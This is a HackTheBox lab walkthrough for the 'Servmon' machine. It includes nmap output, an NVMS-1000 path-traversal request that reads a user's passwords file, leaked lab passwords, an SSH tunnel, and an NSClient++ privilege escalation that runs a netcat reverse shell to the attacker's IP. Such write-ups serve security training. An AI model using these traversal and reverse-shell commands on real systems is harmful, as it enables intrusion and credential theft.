---
title: "Servmon"
date: 2024-03-25
categories: HTB
tags: ["servmon", "ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "htb walkthrough", "hackthebox", "writeup"]
---

# Servmon

# Servmon

# Credentials
| Username | Password          | Hash | Source |
| -------- | ----------------- | ---- | ------ |
| nadine   | L1k3B1gBut7s@W0rk |      |        |
| nathan   |                   |      |        |
|          |                   |      |        |
# Todo
- [ ] 
# Enumeration
- Anonymous access on FTP displays 2 text files with information.
	- Nathan has password-related files on his desktop.
- NVMS LFI on Windows files systems to get passwords.txt file from Nathan's desktop.
- Password spraying the potential passwords from `passwords.txt` with username `nathan` and `nadine` reveals that nadine has SSH access.

## Nmap
# TCP
```sh
PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
22/tcp    open  ssh           syn-ack OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLqFnd0LtYC3vPEYbWRZEOTBIpA++rGtx7C/R2/f2Nrro7eR3prZWUiZm0zoIEvjMl+ZFTe7UqziszU3tF8v8YeguZ5yGcWwkuJCCOROdiXt37INiwgFnRaiIGKg4hYzMcGrhQT/QVx53KZPNJHGuTl18yTlXFvQZjgPk1Bc/0JGw9C1Dx9abLs1zC03S4/sFepnECbfnTXzm28nNbd+VI3UUe5rjlnC4TrRLUMAtl8ybD2LA2919qGTT1HjUf8h73sGWdY9rrfMg4omua3ywkQOaoV/KWJZVQvChAYINM2D33wJJjngppp8aPgY/1RfVVXh/asAZJD49AhTU+1HSvBHO6K9/Bh6p0xWgVXhjuEd0KUyCwRqkvWAjxw5xrCCokjYcOEZ34fA+IkwPpK4oQE279/Y5p7niZyP4lFVl5cu0J9TfWUcavL44neyyNHNSJPOLSMHGgGs10GsfjqCdX0ggjhxc0RqWa9oZZtlVtsIV5WR6MyRsUPTV6N8NRDD8=
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA5iE0EIBy2ljOhQ42zqa843noU8K42IIHcRa9tFu5kUtlUcQ9CghqmRG7yrLjEBxJBMeZ3DRL3xEXH0K5rCRGY=
|   256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN6c7yYxNJoV/1Lp8AQeOGoJrtQ6rgTitX0ksHDoKjhn
80/tcp    open  http          syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|     AuthInfo:
|   GenericLines, GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   X11Probe: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
5666/tcp  open  tcpwrapped    syn-ack
6063/tcp  open  tcpwrapped    syn-ack
6699/tcp  open  tcpwrapped    syn-ack
8443/tcp  open  ssl/https-alt syn-ack
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions, apple-iphoto, docker, hazelcast-http: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     iday
|     :Saturday
|     workers
|     jobs
|     submitted
|     errors
|     threads
|   OfficeScan: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|     jobs
|   metasploit-msgrpc: 
|     HTTP/1.1 403
|     Content-Length: 20
|_    Your not allowed
| http-title: NSClient++
|_Requested resource was /index.html
| http-methods: 
|_  Supported Methods: GET
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03:0c40:5b7a:0f6d:d8c8:78e3:cba7:38b4
| SHA-1: 7083:bd82:b4b0:f9c0:cc9c:5019:2f9f:9291:4694:8334
| -----BEGIN CERTIFICATE-----
| MIICoTCCAYmgAwIBAgIBADANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAlsb2Nh
| bGhvc3QwHhcNMjAwMTE0MTMyNDIwWhcNMjEwMTEzMTMyNDIwWjAUMRIwEAYDVQQD
| DAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDXCoMi
| kUUWbCi0E1C/LfZFrm4UKCheesOFUAITOnrCvfkYmUR0o7v9wQ8yR5sQR8OIxfJN
| vOTE3C/YZjPE/XLFrLhBpb64X83rqzFRwX7bHVr+PZmHQR0qFRvrsWoQTKcjrElo
| R4WgF4AWkR8vQqsCADPuDGIsNb6PyXSru8/A/HJSt5ef8a3dcOCszlm2bP62qsa8
| XqumPHAKKwiu8k8N94qyXyVwOxbh1nPcATwede5z/KkpKBtpNfSFjrL+sLceQC5S
| wU8u06kPwgzrqTM4L8hyLbsgGcByOBeWLjPJOuR0L/a33yTL3lLFDx/RwGIln5s7
| BwX8AJUEl+6lRs1JAgMBAAEwDQYJKoZIhvcNAQEFBQADggEBAAjXGVBKBNUUVJ51
| b2f08SxINbWy4iDxomygRhT/auRNIypAT2muZ2//KBtUiUxaHZguCwUUzB/1jiED
| s/IDA6dWvImHWnOZGgIUsLo/242RsNgKUYYz8sxGeDKceh6F9RvyG3Sr0OyUrPHt
| sc2hPkgZ0jgf4igc6/3KLCffK5o85bLOQ4hCmJqI74aNenTMNnojk42NfBln2cvU
| vK13uXz0wU1PDgfyGrq8DL8A89zsmdW6QzBElnNKpqNdSj+5trHe7nYYM5m0rrAb
| H2nO4PdFbPGJpwRlH0BOm0kIY0az67VfOakdo1HiWXq5ZbhkRm27B2zO7/ZKfVIz
| XXrt6LA=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=9%D=8/26%Time=66CBB661%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(HTTPOpt
SF:ions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nConte
SF:nt-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\
SF:xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x2
SF:0Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-trans
SF:itional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\
SF:">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<scr
SF:ipt\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20win
SF:dow\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</
SF:script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(X11Probe,6B,
SF:"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/html\r
SF:\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:")%r(FourOhFourRequest,65,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-
SF:type:\x20text/html\r\nContent-Length:\x200\r\nConnection:\x20close\r\nA
SF:uthInfo:\x20\r\n\r\n")%r(GenericLines,1B4,"HTTP/1\.1\x20200\x20OK\r\nCo
SF:ntent-type:\x20text/html\r\nContent-Length:\x20340\r\nConnection:\x20cl
SF:ose\r\nAuthInfo:\x20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20
SF:\"-//W3C//DTD\x20XHTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w
SF:3\.org/TR/xhtml1/DTD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=
SF:\"http://www\.w3\.org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title
SF:></title>\r\n\x20\x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20window\.location\.href\x20=\x20\"Pages/lo
SF:gin\.htm\";\r\n\x20\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body
SF:>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=9%D=8/26%Time=66CBB667%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,AE,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocat
SF:ion:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0iday\0\0\0\0:Saturday\0
SF:\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x03\x18\x8cX\x
SF:12\x10\n\tsubmitted\x12\x03\x18\x8bX\x12\x0c\n\x06errors\x12\x02\x18\0\
SF:x12\r\n\x07threads\x12\x02\x18\x01\0\0\0\0\0\0\x02\x01\0\0\0\0")%r(HTTP
SF:Options,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x
SF:20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nContent-Le
SF:ngth:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,"HTTP/1\
SF:.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(
SF:SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocumen
SF:t\x20not\x20found")%r(OfficeScan,74,"HTTP/1\.1\x20302\r\nContent-Length
SF::\x200\r\nLocation:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\
SF:n\x04jobs\x12\x03\x18\x97X\x12")%r(apple-iphoto,36,"HTTP/1\.1\x20404\r\
SF:nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(metasploit-m
SF:sgrpc,A8,"HTTP/1\.1\x20403\r\nContent-Length:\x2020\r\n\r\n403\x20Your\
SF:x20not\x20allowed\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(hazelcast-http,36,"HTTP/1\.1\x20404\r\
SF:nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(docker,36,"H
SF:TTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20foun
SF:d");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

## FTP
## Attempts
![screenshot](/assets/images/servmon2.png)

## Notes
## Confidential.txt
![screenshot](/assets/images/servmon3.png)
## Notes to do.txt
![screenshot](/assets/images/servmon4.png)
- public access to NVMS

## 80-HTTP
# Directory Fuzzing
## Gobuster
```sh

```


# Screenshots
![screenshot](/assets/images/servmon1.png)

Tried:
- `admin : admin`

## SMB
## Notes
```text
nadine : L1k3B1gBut7s@W0rk
```

## Attempts
![screenshot](/assets/images/servmon6.png)

![screenshot](/assets/images/servmon9.png)



# Initial Access
- SSH as nadine.

## Notes
- public access to NVMS


## Attempts
## NVMS-1000 LFI
https://www.exploit-db.com/exploits/48311

```sh
curl https://10.10.10.184/../../../../../../../../../../../../windows/win.ini
```

![screenshot](/assets/images/servmon7.png)

LFI on Windows file system
```sh
/../../../../../../../../../../../../users/nathan/desktop/passwords.txt
```

```text
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

![screenshot](/assets/images/servmon8.png)
## NSClient++
[NSClient++ 0.5.2.35 - Authenticated Remote Code Execution](https://www.exploit-db.com/exploits/48360)
- Need credentials

# SSH
```text
nadine : L1k3B1gBut7s@W0rk
```

![screenshot](/assets/images/servmon10.png)

```text
nadine : L1k3B1gBut7s@W0rk
```

![screenshot](/assets/images/servmon10.png)

# Lateral Movement
- N/A
# Privilege Escalation
- NSClient++ PE exploit
	- SSH tunneling to access the login page as local host.

## NSClient++ PE
https://www.exploit-db.com/exploits/46802

![screenshot](/assets/images/servmon11.png)

```text
ew2x6SsGTxjRwXOT
```

![screenshot](/assets/images/servmon12.png)

![screenshot](/assets/images/servmon13.png)

## SSH Tunneling
```sh
sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443              
```

https://127.0.0.1:8443/
![screenshot](/assets/images/servmon14.png)

![screenshot](/assets/images/servmon15.png)

Shell.bat
```sh
\programdata\nc.exe 10.10.14.37 443 -e cmd
```

![screenshot](/assets/images/servmon16.png)

![screenshot](/assets/images/servmon17.png)

The script has been updated in the 
`C:\"Program Files"\nsclient++\nsclient.ini`
![screenshot](/assets/images/servmon18.png)
![screenshot](/assets/images/servmon20.png)

![screenshot](/assets/images/servmon19.png)

Reoad
![screenshot](/assets/images/servmon21.png)


